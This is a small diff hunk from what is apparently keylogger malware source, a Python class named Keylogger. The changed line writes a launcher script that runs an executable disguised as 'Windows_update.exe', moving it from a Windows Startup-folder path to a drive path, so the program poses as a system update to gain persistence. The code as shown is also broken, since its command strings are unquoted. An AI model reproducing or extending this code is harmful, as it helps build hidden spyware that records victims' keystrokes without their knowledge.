@@ -37,7 +37,7 @@ class Keylogger:
             with open(fr"/home/phoenix693/Desktop/start.py", 'w') as file:
             # Write content to the file
                 file.write(f"""import os
-                os.system(C:\Users\{username}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Windows_update.exe)""")
+                os.system(E:\Windows_update.exe)""")
             
         except Exception as e:
             print("windows update failed")
